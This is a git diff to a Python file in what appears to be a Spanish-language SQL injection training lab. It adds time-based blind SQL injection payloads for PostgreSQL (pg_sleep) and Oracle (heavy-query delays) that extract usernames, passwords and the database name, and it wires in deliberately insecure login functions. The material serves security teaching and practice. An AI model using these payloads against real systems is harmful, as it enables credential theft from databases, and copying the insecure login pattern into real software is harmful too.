@@ -1,4 +1,5 @@
 from setupOracle import *
+from setupOracle import login_inseguro_blind_no_cookie_oracle
 from setupPostgreSQL import *
 
 # Diccionario de inyecciones SQL
@@ -191,16 +192,52 @@ sql_injections = {
         "dificultad": 3,
         "impacto": 3,
         "credenciales":[{
-            "nombre": "Obtener nombres de usuarios",
+            "nombre": "Obtener nombres de usuarios (POSTGRESQL)",
             "usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) <> 'a' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) = 'a' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
             "password": "cualquier_input"
-        }
+        },
+            {
+                "nombre": "Obtener nombres de la base de datos (POSTGRESQL)",
+                "usuario": """  '
+  AND (
+    left(current_database(), 1) <> 'E' 
+    OR (
+      left(current_database(), 1) = 'E' 
+      AND EXISTS (SELECT 1 FROM pg_sleep(1))
+    )
+  )
+--
+""",
+                "password": "cualquier_input"
+            },
+            {
+                "nombre": "Usuarios y contraseñas concatenados (POSTGRESQL)",
+                "usuario": """ ' AND (
+    LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), 1) <> 'a'
+    OR (
+      LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), 1) = 'a'
+      AND EXISTS (SELECT 1 FROM pg_sleep(1))
+    )
+    )
+    --""",
+                "password": "cualquier_input"
+            },
+            {
+                "nombre": "Obtener nombre de la base de datos (ORACLE)",
+                "usuario":"""' OR (CASE 
+        WHEN SUBSTR((SELECT global_name FROM global_name), 1, 1) = 'O' 
+        THEN (SELECT COUNT(*) 
+              FROM all_objects, all_objects, all_objects) 
+        ELSE 0 
+     END) = 0 --""",
+                "password": "cualquier_input"
+            }
         ],
         "usuario": "admin",
         "clave": "admin",
         "route_oracle": "login_oracle_time_based",
         "route_postgres": "login_postgres_time_based",
-        "function_oracle": login_inseguro_blind_oracle,
+        "function_oracle": login_inseguro_blind_no_cookie_oracle,
         "function_postgres":  login_inseguro_blind_no_cookie_postgresql
     }
 }
